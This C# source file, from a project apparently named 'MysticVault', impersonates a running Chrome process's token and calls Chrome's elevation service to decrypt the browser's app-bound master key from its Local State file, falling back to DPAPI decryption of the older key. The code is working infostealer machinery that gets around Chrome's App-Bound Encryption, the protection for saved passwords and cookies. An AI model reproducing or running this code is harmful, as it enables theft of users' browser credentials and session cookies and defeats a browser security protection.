using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;

namespace MysticVault;

internal static class ChromeElevationServiceProxy
{
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, out IntPtr phNewToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SetThreadToken(IntPtr? ThreadHandle, IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool RevertToSelf();

    [DllImport("ole32.dll", SetLastError = true)]
    private static extern int CoCreateInstance(ref Guid rclsid, IntPtr pUnkOuter, uint dwClsContext, ref Guid riid, out IntPtr ppv);

    [DllImport("ole32.dll", SetLastError = true)]
    private static extern int CoSetProxyBlanket(IntPtr pProxy, uint dwAuthnSvc, uint dwAuthzSvc, IntPtr pServerAuthInfo, uint dwImpLevel, uint dwAuthnLevel, IntPtr pAuthInfo, uint dwCapabilities);

    private const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
    private const uint TOKEN_DUPLICATE = 0x0002;
    private const uint TOKEN_IMPERSONATE = 0x0004;
    private const uint TOKEN_QUERY = 0x0008;
    private const uint RPC_C_AUTHN_WINNT = 10;
    private const uint RPC_C_AUTHZ_NONE = 0;
    private const uint RPC_C_AUTHN_LEVEL_CALL = 4;
    private const uint RPC_C_IMP_LEVEL_IMPERSONATE = 3;
    private const uint EOAC_DYNAMIC_CLOAKING = 0x40;
    private const uint CLSCTX_LOCAL_SERVER = 4;

    private static Guid CLSID_Elevator = new("{DC7FEF2B-281C-44A0-9DE3-5BD6C4F55EF4}");
    private static Guid IID_IElevator = new("{A84E2B0D-1E25-4A4B-97ED-ABD5825D42C3}");

    private enum SECURITY_IMPERSONATION_LEVEL
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }

    private enum TOKEN_TYPE
    {
        TokenPrimary = 1,
        TokenImpersonation
    }

    [ComImport, Guid("A84E2B0D-1E25-4A4B-97ED-ABD5825D42C3"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    private interface IElevator
    {
        void RunRecoveryCRXElevated(
            [MarshalAs(UnmanagedType.LPWStr)] string crx_path,
            [MarshalAs(UnmanagedType.LPWStr)] string browser_appid,
            [MarshalAs(UnmanagedType.LPWStr)] string browser_version,
            [MarshalAs(UnmanagedType.LPWStr)] string session_id,
            uint caller_proc_id,
            out IntPtr proc_handle);

        void EncryptData(
            [MarshalAs(UnmanagedType.BStr)] string protection_level,
            [MarshalAs(UnmanagedType.BStr)] string plaintext,
            [Out, MarshalAs(UnmanagedType.BStr)] out string ciphertext,
            out uint last_error);

        void DecryptData(
            [MarshalAs(UnmanagedType.BStr)] string ciphertext,
            [Out, MarshalAs(UnmanagedType.BStr)] out string plaintext,
            out uint last_error);
    }

    public static byte[]? TryDecryptAppBoundKey(string base64EncryptedBlob, string chromeExePath)
    {
        uint? pid = FindProcessByPath(chromeExePath);
        if (pid == null) return null;

        IntPtr hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid.Value);
        if (hProcess == IntPtr.Zero) return null;

        if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, out IntPtr chromeToken))
        {
            CloseHandle(hProcess);
            return null;
        }

        if (!DuplicateTokenEx(chromeToken, 0, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenImpersonation, out IntPtr impersonationToken))
        {
            CloseHandle(chromeToken);
            CloseHandle(hProcess);
            return null;
        }

        CloseHandle(chromeToken);
        CloseHandle(hProcess);

        if (!SetThreadToken(null, impersonationToken))
        {
            CloseHandle(impersonationToken);
            return null;
        }

        try
        {
            int hr = CoCreateInstance(ref CLSID_Elevator, IntPtr.Zero, CLSCTX_LOCAL_SERVER, ref IID_IElevator, out IntPtr elevatorPtr);
            if (hr != 0 || elevatorPtr == IntPtr.Zero) return null;

            try
            {
                hr = CoSetProxyBlanket(elevatorPtr, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, IntPtr.Zero,
                    RPC_C_IMP_LEVEL_IMPERSONATE, RPC_C_AUTHN_LEVEL_CALL, IntPtr.Zero, EOAC_DYNAMIC_CLOAKING);
                if (hr != 0) return null;

                var elevator = Marshal.GetObjectForIUnknown(elevatorPtr) as IElevator;
                if (elevator == null) return null;

                elevator.DecryptData(base64EncryptedBlob, out string result, out _);
                if (!string.IsNullOrEmpty(result))
                    return Convert.FromBase64String(result);

                return null;
            }
            finally
            {
                Marshal.Release(elevatorPtr);
            }
        }
        finally
        {
            RevertToSelf();
            CloseHandle(impersonationToken);
        }
    }

    private static uint? FindProcessByPath(string exePath)
    {
        var processes = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(exePath));
        string targetPath = exePath.Replace('/', '\\').ToLowerInvariant();
        foreach (var proc in processes)
        {
            try
            {
                string? fileName = proc.MainModule?.FileName;
                if (fileName != null && fileName.Replace('/', '\\').ToLowerInvariant() == targetPath)
                    return (uint)proc.Id;
            }
            catch { }
        }
        return null;
    }

    public static string? TryGetMasterKeyFromChromeAppBoundKey(string localStatePath, string chromeExePath)
    {
        string content = File.ReadAllText(localStatePath);
        using var document = JsonDocument.Parse(content);
        if (!document.RootElement.TryGetProperty("os_crypt", out var osCrypt))
            return null;

        if (osCrypt.TryGetProperty("app_bound_encrypted_key", out var appBoundElement))
        {
            string appBoundKey = appBoundElement.GetString() ?? "";
            if (appBoundKey.StartsWith("APPB"))
            {
                string base64Blob = appBoundKey.Substring(4);
                var masterKey = TryDecryptAppBoundKey(base64Blob, chromeExePath);
                if (masterKey != null)
                    return Convert.ToBase64String(masterKey);
            }
        }

        if (osCrypt.TryGetProperty("encrypted_key", out var encryptedKeyElement))
        {
            string encryptedKeyB64 = encryptedKeyElement.GetString() ?? "";
            byte[] encryptedKeyBytes = Convert.FromBase64String(encryptedKeyB64);
            string prefix = Encoding.ASCII.GetString(encryptedKeyBytes, 0, 4);

            if (prefix == "APPB")
            {
                string base64Blob = Encoding.ASCII.GetString(encryptedKeyBytes, 4, encryptedKeyBytes.Length - 4);
                var masterKey = TryDecryptAppBoundKey(base64Blob, chromeExePath);
                if (masterKey != null)
                    return Convert.ToBase64String(masterKey);
                return null;
            }

            byte[] dpapiEncryptedKey = new byte[encryptedKeyBytes.Length - 5];
            Array.Copy(encryptedKeyBytes, 5, dpapiEncryptedKey, 0, dpapiEncryptedKey.Length);
            byte[] dpapiDecrypted = ProtectedData.Unprotect(dpapiEncryptedKey, null, DataProtectionScope.CurrentUser);
            return Convert.ToBase64String(dpapiDecrypted);
        }

        return null;
    }
}
